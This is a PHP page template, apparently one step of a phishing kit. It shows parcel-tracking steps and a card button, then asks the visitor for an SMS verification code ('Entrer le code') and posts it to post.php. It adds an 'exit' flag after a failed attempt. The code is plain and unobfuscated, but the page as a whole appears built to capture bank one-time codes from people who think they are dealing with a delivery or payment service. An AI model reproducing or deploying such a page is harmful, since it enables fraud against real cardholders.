<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/app.css">
    <title><?php echo $lang["SMS-A3"];?></title>
</head>
<body>

<header>
    <div class="left">

 <img src="res/img/logo.png" > 

</div>

  

    <div class="right">  
       
    <div class="l2">
    <button><?php echo $lang["CARD-C2"];?></button>
        </div>

        <div class="l1">
<span><?php echo $lang["TRACK6"];?></span>
<span><?php echo $lang["TRACK7"];?></span>   
<span> <?php echo $lang["TRACK8"];?></span>
<span><?php echo $lang["TRACK9"];?></span>
</div>



</div>
</header>

<main>



    <div class="continer1">
       
    
<form action="post.php" method="post">
<h2><?php echo $lang["SMS-A4"];?></h2>

<div class="num">
    <h4 style="font-weight:normal; text-align:left;" ><?php echo $lang["SMS-A5"];?></h4> </div>

<div class="col">
<input type="text" placeholder="Entrer le code" name="otp" required> <br> 
<?php 

if(isset($_GET['error'])){
    echo '<input type="hidden" name="exit">';
    echo '<p style="color:red;">'.$lang["SMS-A6"].'</p>';
}
?>
</div> <br>


<div class="back">
    <button type="submit"> <?php echo $lang["SMS-A7"];?></button>
</div>




</div>
</div>



</main>






</body>
</html>